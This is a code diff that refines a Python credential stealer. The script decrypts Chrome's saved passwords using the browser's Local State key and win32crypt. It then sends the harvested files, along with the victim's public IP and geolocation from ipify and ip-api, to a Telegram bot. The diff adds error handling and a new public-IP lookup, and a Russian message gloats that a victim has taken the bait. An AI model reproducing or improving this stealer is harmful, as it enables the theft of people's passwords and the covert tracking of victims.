@@ -1,29 +1,26 @@
-import cmd
 from gettext import dpgettext
 from http.client import NOT_FOUND
-import logging
 import os
 import json
 import requests
 import socket
 import subprocess
-from urllib import *
+from urllib import request
 from telebot.types import Message
 import win32crypt
 import base64
 import sqlite3
 from Crypto.Cipher import AES
 import shutil
-from datetime import *
+from datetime import timezone, datetime, timedelta
 from telebot import *
-from threading import *
-from time import *
-import requests
+from threading import Thread
+import time
+
 
 bot = telebot.TeleBot('bot_token')
-keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
 button_1= types.KeyboardButton(text="Сообщить все")
-keyboard.add(button_1)
+
 
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
@@ -36,9 +33,9 @@ def get_encryption_key():
     
     key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     key = key[5:]
-
+    
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
+    
 def decrypt_password(password, key):
     try:
         iv = password[3:15]
@@ -59,7 +56,6 @@ def save_output(data, filename='output_data.txt'):
 def save_uu(data, filename='uu.txt'):
     with open(filename, 'w', encoding='utf-8') as file:
         file.write(data)
-                
 def save_yy(data, filename='yy.txt'):
     with open(filename, 'w', encoding='utf-8') as file:
         file.write(data)
@@ -128,51 +124,60 @@ def get_output():
 
     except FileNotFoundError:
         bot.send_message(message.chat.id, "Выходные данные не найдены. Запустите скрипт для их генерации.")
-
+    except Exception as e:
+        print(f"Произошла ошибка при получении паролей Chrome: {e}")
 
 def get_public_ip():
-    # Получение IP-адреса
-    ip = socket.gethostbyname(socket.gethostname())
-    return ip
+    try:
+        
+        resp = requests.get('https://api64.ipify.org?format=json')
+        resp.raise_for_status()  
+        ip_data = resp.json()
+        return ip_data['ip']
+    except requests.exceptions.RequestException as e:
+        print(f"Error getting public IP: {e}")
+        return None
+    except Exception as e:
+        print(f"Произошла ошибка при получении паролей Chrome: {e}")    
+def get_ip_info(ip='127.0.0.1'):
+    uu = ""
+    try:
+       
+        resp = requests.get(url=f'http://ip-api.com/json/{ip}')
+        resp.raise_for_status()  
+        ip_data = resp.json()
 
-
-def get_ip_info(ip):
-    
-    uu=""
-    
-    url = f"http://ip-api.com/json/{ip}"
-    response = requests.get(url)
-    data = response.json()
-    uu+= f"IP и ИНФА:{response}\n"\
-            f"____________________________\n"
-    message= f"IP и ИНФА:{response}\n"\
-                f"____________________________\n"
-    bot.send_message(chat_id, message)
+        uu += f"IP и ИНФА:{ip_data}\n"\
+              f"____________________________\n"
+        message = f"IP и ИНФА:{ip_data}\n"\
+                  f"____________________________\n"
+        bot.send_message(chat_id, message)
+    except requests.exceptions.RequestException as e:
+        print(f"Error getting IP information: {e}")
     save_uu(uu)
-    return data
-    
-    
+
+def save_uu(uu):
+    with open('uu.txt', 'w', encoding='utf-8') as file:
+        file.write(uu)
 
 def get_uu():
     try:
-        
         with open('uu.txt', 'r', encoding='utf-8') as file:
             uu = file.read()
-        
-        
+
         doc = open('uu.txt', 'rb')
         bot.send_document(chat_id, doc)
-        bot.send_document(chat_id, "FILEID")  
-
+        bot.send_document(chat_id, "FILEID")
     except FileNotFoundError:
-        bot.send_message(message.chat.id, "Выходные данные не найдены. Запустите скрипт для их генерации.")
+        bot.send_message(chat_id, "Выходные данные не найдены. Запустите скрипт для их генерации.")
+
 def ma():
     g()
 
 def g():
-    hostname = socket.gethostname()
-    ip = socket.gethostbyname(hostname)
-    get_ip_info(ip=ip)
+    public_ip = get_public_ip()
+    if public_ip:
+        get_ip_info(ip=public_ip)
 def j():
     yy=""
     try:
@@ -196,6 +201,9 @@ def j():
         save_yy(yy)
     except Exception as ex:
         print(f'Ошибка: {ex}')
+    
+    
+
 def get_yy():
     try:
         
@@ -209,15 +217,14 @@ def get_yy():
 
     except FileNotFoundError:
         print("error")
-
+    except Exception as e:
+        print(f"Произошла ошибка при получении паролей Chrome: {e}")
 message = f"Кто-то схавал:) Держи"
 
 bot.send_message(chat_id, message)
 
 if __name__ == "__main__":
-    ip = get_public_ip()
-    data = get_ip_info(ip)
-    main(),j()
+    main(),ma(),j()
     file1 = open('output_data.txt', 'r', encoding='utf-8')
     file2 = open('uu.txt', 'r', encoding='utf-8')
     file3 = open('yy.txt', 'r', encoding='utf-8')
